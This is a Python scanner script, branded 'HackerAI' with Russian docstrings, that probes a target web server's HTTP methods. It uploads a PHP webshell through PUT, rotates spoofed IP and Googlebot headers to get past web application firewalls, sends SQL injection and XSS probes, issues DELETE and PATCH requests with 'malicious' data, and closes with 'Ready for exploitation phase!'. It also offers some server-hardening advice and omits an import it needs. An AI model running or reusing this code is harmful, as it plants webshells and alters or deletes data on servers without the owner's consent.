import requests
import time
import json
import argparse
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style, Back
import threading
from datetime import datetime
import base64
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

class HTTPMethodsUltimateScanner:
    def __init__(self, target_url: str, threads: int = 10, aggressive: bool = False, waf_bypass: bool = True):
        self.target = self.normalize_url(target_url)
        self.threads = threads
        self.aggressive = aggressive
        self.waf_bypass = waf_bypass
        self.session = self.create_session()
        self.results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'methods': {},
            'risks': {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': []},
            'waf_detected': False,
            'bypass_success': False,
            'override_params': [],
            'security_headers': {},
            'recommendations': []
        }
        self.lock = threading.Lock()
        self.session.cookies.clear()
        
        
        self.bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1)'},
            {'X-Forwarded-Proto': 'https'}
        ]

    def normalize_url(self, url: str) -> str:
        """🔧 Нормализация URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        parsed = urlparse(url.rstrip('/'))
        return f"{parsed.scheme}://{parsed.netloc}/"

    def create_session(self):
        """🌐 Создание оптимизированной сессии"""
        session = requests.Session()
        session.verify = False
        session.timeout = 10
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })
        return session

    def test_method(self, method: str, payload: dict = None, extra_headers: dict = None):
        """🔍 Тестирование HTTP метода с WAF bypass"""
        try:
            url = self.target
            
            
            data = payload or {}
            if method == 'PUT':
                data = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
            elif method == 'POST':
                data = {'test': 'A' * 1000, 'cmd': 'whoami'}
            elif method == 'PATCH':
                data = {'update': 'malicious'}
            elif method == 'DELETE':
                data = {'id': '1'}
            
            
            headers = extra_headers or {}
            if self.waf_bypass:
                bypass_header = self.bypass_headers[hash(method) % len(self.bypass_headers)]
                headers.update(bypass_header)
            
            if method.upper() == 'CONNECT':
                response = self.session.request(method, url, timeout=8, headers=headers, data=data, allow_redirects=False)
            else:
                response = self.session.request(method, url, timeout=8, headers=headers, data=data, allow_redirects=False)
            
            return {
                'status': response.status_code,
                'headers': dict(response.headers),
                'length': len(response.content),
                'time': response.elapsed.total_seconds()
            }
            
        except requests.exceptions.Timeout:
            return {'status': 'TIMEOUT', 'headers': {}, 'length': 0, 'time': 999}
        except requests.exceptions.ConnectionError:
            return {'status': 'CONN_ERROR', 'headers': {}, 'length': 0, 'time': 999}
        except Exception:
            return {'status': 'ERROR', 'headers': {}, 'length': 0, 'time': 999}

    def detect_waf(self):
        """🛡️ Детекция WAF"""
        payloads = [
            "' OR 1=1--",
            "<script>alert(1)</script>",
            "'; DROP TABLE users;--"
        ]
        
        for payload in payloads:
            resp = self.session.get(f"{self.target}?test={payload}", timeout=5)
            if any(blocker in resp.text.lower() for blocker in ['blocked', 'forbidden', 'cloudflare', 'waf']):
                self.results['waf_detected'] = True
                print(f"{Fore.RED}[🛡️ WAF DETECTED]{Style.RESET_ALL}")
                return True
        return False

    def analyze_risk(self, method: str, result: dict):
        """🎯 Анализ рисков с расширенной логикой"""
        status = result['status']
        headers = result['headers']
        issues = []
        risk_level = 'NONE'

        
        if isinstance(status, int) and status in [200, 201, 202, 204, 301, 302, 303, 307, 308]:
            if method == 'PUT':
                risk_level = 'CRITICAL'
                issues.extend([
                    '🚨 FILE UPLOAD ENABLED - Webshell deployment possible!',
                    '💾 Test: PUT /shell.php with PHP payload',
                    '🔥 Exploit: Direct file write vulnerability'
                ])
            elif method == 'DELETE':
                risk_level = 'CRITICAL'
                issues.extend([
                    '🗑️ RESOURCE DELETION ENABLED - Mass deletion possible!',
                    '💥 Test: DELETE /admin/config.json',
                    '⚠️  No authentication required'
                ])
            elif method == 'TRACE':
                risk_level = 'HIGH'
                issues.extend([
                    '🎭 XST (Cross-Site Tracing) VULNERABLE!',
                    '🔍 Credentials leakage via TRACE',
                    '🛠️ Test: TRACE with auth headers'
                ])
            elif method == 'PATCH':
                risk_level = 'HIGH'
                issues.extend([
                    '🩹 PATCH ENABLED - Config manipulation possible!',
                    '⚙️ Test: PATCH /api/config with malicious data',
                    '🚨 Often lacks proper validation'
                ])
            elif method == 'CONNECT':
                risk_level = 'HIGH'
                issues.extend([
                    '🔗 HTTP CONNECT TUNNELING ENABLED!',
                    '🌐 Proxy abuse / SSRF possible',
                    '⚠️  Dangerous for proxy servers'
                ])
            elif method == 'OPTIONS':
                risk_level = 'MEDIUM'
                if 'Allow' in headers:
                    issues.append(f'📋 Exposed methods: {headers.get("Allow", "Unknown")}')
            elif method in ['POST', 'HEAD']:
                risk_level = 'LOW'
                issues.append('✅ Standard method - Verify CSRF protection')

        
        elif isinstance(status, int) and status in [401, 403, 405, 406]:
            risk_level = 'SECURE'
            issues.append('✅ Proper HTTP restrictions')

        return risk_level, issues

    def scan_override_parameters(self):
        """🔍 Поиск параметров обхода методов"""
        params = ['_method', 'method', 'X-HTTP-Method-Override', 'X-Method-Override', 
                 'http_method', 'HTTP_METHOD', 'REQUEST_METHOD']
        
        try:
            resp = self.session.get(self.target, timeout=10)
            content = resp.text.lower()
            
            for param in params:
                if param in content:
                    self.results['override_params'].append(param)
        except:
            pass

    def check_security_headers(self):
        """🛡️ Проверка security headers"""
        resp = self.session.get(self.target, timeout=10)
        headers = dict(resp.headers)
        
        required = {
            'X-Frame-Options': 'DENY|SAMEORIGIN',
            'X-Content-Type-Options': 'nosniff',
            'Content-Security-Policy': '.*',
            'Strict-Transport-Security': '.*max-age.*',
            'Referrer-Policy': '.*'
        }
        
        missing = []
        for header, pattern in required.items():
            if header not in headers or not re.match(pattern, str(headers[header]), re.IGNORECASE):
                missing.append(header)
        
        self.results['security_headers'] = {'missing': missing, 'present': len(required) - len(missing)}

    def threaded_scan(self):
        """⚡ Многопоточное сканирование"""
        methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'TRACE', 'PATCH', 'CONNECT']
        
        print(f"{Fore.CYAN}{'='*80}")
        print(f"{Fore.GREEN}🚀 THREADed SCAN STARTED | Threads: {self.threads} | Target: {self.target}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_method = {
                executor.submit(self.test_method, method, None, self.bypass_headers[i % len(self.bypass_headers)]): 
                method for i, method in enumerate(methods)
            }
            
            for future in as_completed(future_to_method):
                method = future_to_method[future]
                try:
                    result = future.result(timeout=15)
                    risk, issues = self.analyze_risk(method, result)
                    
                    with self.lock:
                        self.results['methods'][method] = {
                            'status': result['status'],
                            'length': result['length'],
                            'time': f"{result['time']:.2f}s",
                            'risk': risk,
                            'issues': issues
                        }
                        
                        if risk in self.results['risks']:
                            self.results['risks'][risk].append(method)
                    
                    
                    status_color = Fore.GREEN if isinstance(result['status'], int) and 200 <= result['status'] < 400 else Fore.RED
                    risk_color = {
                        'CRITICAL': Fore.MAGENTA, 'HIGH': Fore.RED, 'MEDIUM': Fore.YELLOW, 
                        'LOW': Fore.BLUE, 'SECURE': Fore.GREEN, 'NONE': Fore.CYAN
                    }.get(risk, Fore.WHITE)
                    
                    print(f"{Fore.CYAN}[{method:10}] {status_color}{result['status']:3} {Fore.WHITE}| {risk_color}{risk:9} {Fore.WHITE}| {result['time']:5} | Length: {result['length']:4}")
                    
                except Exception as e:
                    print(f"{Fore.RED}[{method}] ERROR: {str(e)[:30]}{Style.RESET_ALL}")

    def generate_recommendations(self):
        """💡 Генерация рекомендаций по исправлению"""
        recs = []
        
        if self.results['risks']['CRITICAL']:
            recs.extend([
                "🚨 IMMEDIATE ACTION REQUIRED:",
                "   1. DISABLE PUT/DELETE/TRACE methods at WEB SERVER level",
                "   2. Apache: <LimitExcept GET POST HEAD OPTIONS> Require all denied </LimitExcept>",
                "   3. Nginx: if ($request_method !~ ^(GET|HEAD|POST|OPTIONS)$) { return 405; }",
                "   4. IIS: Request Filtering -> Deny unlisted verbs"
            ])
        
        recs.extend([
            "🔧 BEST PRACTICES:",
            "   • Method whitelisting ONLY required methods",
            "   • CSRF protection for POST/PUT/PATCH/DELETE",
            "   • Rate limiting on all endpoints",
            "   • WAF rules for method abuse detection",
            "   • Audit logs for unusual method patterns"
        ])
        
        self.results['recommendations'] = recs
        return recs

    def save_report(self):
        """📊 Сохранение профессионального отчета"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"http_methods_audit_{urlparse(self.target).netloc}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        print(f"\n{Fore.GREEN}📊 PROFESSIONAL REPORT SAVED: {filename}{Style.RESET_ALL}")
        return filename

    def run_full_audit(self):
        """🚀 Полный аудит"""
        print(f"{Fore.MAGENTA}{'='*80}")
        print(f"{Fore.YELLOW}🔥 HACKERAI HTTP METHODS ULTIMATE SCANNER v2.0")
        print(f"{Fore.CYAN}Target: {self.target} | Threads: {self.threads} | Aggressive: {self.aggressive}")
        print(f"{Fore.MAGENTA}{'='*80}{Style.RESET_ALL}")
        
        
        self.detect_waf()
        
        
        self.threaded_scan()
        
        self.scan_override_parameters()
        self.check_security_headers()
        
        
        self.generate_recommendations()
        
        
        self.print_results()
        report_file = self.save_report()
        
        print(f"\n{Fore.GREEN}✅ PENTEST COMPLETE! Report: {report_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🎯 Ready for exploitation phase!{Style.RESET_ALL}")

    def print_results(self):
        """📋 Красивый вывод результатов"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.WHITE}📊 EXECUTIVE SUMMARY")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        
        
        critical = len(self.results['risks']['CRITICAL'])
        high = len(self.results['risks']['HIGH'])
        print(f"{Fore.MAGENTA}🔴 CRITICAL: {critical} methods")
        print(f"{Fore.RED}🟠 HIGH:     {high} methods")
        print(f"{Fore.YELLOW}🟡 MEDIUM:   {len(self.results['risks']['MEDIUM'])} methods")
        print(f"{Fore.GREEN}🟢 SECURE:   {sum(1 for m in self.results['methods'].values() if m['risk'] == 'SECURE')} methods")
        
        
        if critical > 0:
            print(f"\n{Fore.MAGENTA}🚨 CRITICAL VULNERABILITIES:{Style.RESET_ALL}")
            for method in self.results['risks']['CRITICAL']:
                issues = self.results['methods'][method]['issues']
                print(f"  {Fore.MAGENTA}• {method}: {issues[0]}{Style.RESET_ALL}")
        
        
        print(f"\n{Fore.YELLOW}💡 RECOMMENDATIONS:{Style.RESET_ALL}")
        for rec in self.results['recommendations'][:5]:  # Top 5
            print(f"   {rec}")

def main():
    parser = argparse.ArgumentParser(description="🔥 HackerAI HTTP Methods Ultimate Scanner", add_help=False)
    parser.add_argument("target", help="Target URL (http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads (default: 10)")
    parser.add_argument("-a", "--aggressive", action="store_true", help="Aggressive mode")
    parser.add_argument("--no-waf-bypass", action="store_true", help="Disable WAF bypass")
    parser.add_argument("-h", "--help", action="store_true", help="Show help")
    
    args = parser.parse_args()
    
    if args.help:
        print("""
🔥 USAGE: python3 http_methods_ultimate.py [OPTIONS] <target>

OPTIONS:
  -t, --threads N      Threads count (1-50, default: 10)
  -a, --aggressive     Skip delays, max speed
  --no-waf-bypass      Disable WAF bypass headers
  -h, --help           Show this help

EXAMPLES:
  python3 http_methods_ultimate.py https://target.com
  python3 http_methods_ultimate.py http://192.168.1.100 -t 20 -a
        """)
        return
    
    scanner = HTTPMethodsUltimateScanner(
        args.target, 
        threads=min(args.threads, 50), 
        aggressive=args.aggressive,
        waf_bypass=not args.no_waf_bypass
    )
    scanner.run_full_audit()

if __name__ == "__main__":
    main()